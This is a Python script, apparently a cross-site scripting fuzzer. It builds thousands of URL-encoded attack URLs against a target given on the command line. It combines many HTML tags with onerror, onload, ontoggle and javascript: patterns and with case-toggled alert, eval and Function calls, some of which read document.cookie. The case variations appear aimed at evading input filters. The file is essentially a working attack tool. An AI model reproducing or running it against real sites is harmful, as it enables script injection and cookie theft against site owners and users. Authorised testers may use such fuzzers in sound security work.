import urllib.parse
import sys
import itertools

def toggle_case(s):
    return [''.join(x) for x in itertools.product(*((c.upper(), c.lower()) for c in s))]

def generate_xss_payloads():
    html_tags = [
        "a", "abbr", "address", "area", "article", "aside", "audio", "b", "base", "bdi", "bdo",
        "blockquote", "body", "br", "button", "canvas", "caption", "cite", "code", "col", "colgroup",
        "data", "datalist", "dd", "del", "details", "dfn", "dialog", "div", "dl", "dt", "em", "embed",
        "fieldset", "figcaption", "figure", "footer", "form", "h1", "h2", "h3", "h4", "h5", "h6",
        "head", "header", "hr", "html", "i", "iframe", "img", "input", "ins", "kbd", "label", "legend",
        "li", "link", "main", "map", "mark", "meta", "meter", "nav", "noscript", "object", "ol", "optgroup",
        "option", "output", "p", "param", "picture", "pre", "progress", "q", "rp", "rt", "ruby", "s",
        "samp", "script", "section", "select", "small", "source", "span", "strong", "style", "sub", "summary",
        "sup", "svg", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time", "title",
        "tr", "track", "u", "ul", "var", "video", "wbr"
    ]
    
    js_functions = ["alert", "confirm", "prompt", "eval", "setTimeout", "setInterval", "Function"]
    js_payloads = [
        "document.cookie",
        "Meshari-Almalki!"
    ]

    js_function_variations = []
    for func in js_functions:
        js_function_variations.extend(toggle_case(func))
        js_combinations = []
    for func in js_function_variations:
        for payload in js_payloads:
            js_combinations.append(f"{func}({payload});")
    
    payload_patterns = [
        '<{tag} x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="{js_code}">',
        '<{tag} x=xxxxxxx style="x:expression({js_code});">',
        '<{tag} x=xxxxxxx src="javascript:{js_code}">',
        '<{tag} x=xxxxxxx onmouseover="{js_code}">',
        '<{tag} x=xxxxxxx onerror="{js_code}">',
        '<{tag} x=xxxxxxx onload="{js_code}">'
    ]

    base_url = sys.argv[1]
    payloads = []
    for tag in html_tags:
        for pattern in payload_patterns:
            for js_code in js_combinations:
                payload = pattern.format(tag=tag, js_code=js_code)
                encoded_payload = urllib.parse.quote(payload)
                full_url = base_url + encoded_payload
                payloads.append(full_url)

    return payloads

xss_payloads = generate_xss_payloads()
for payload in xss_payloads:
    print(payload)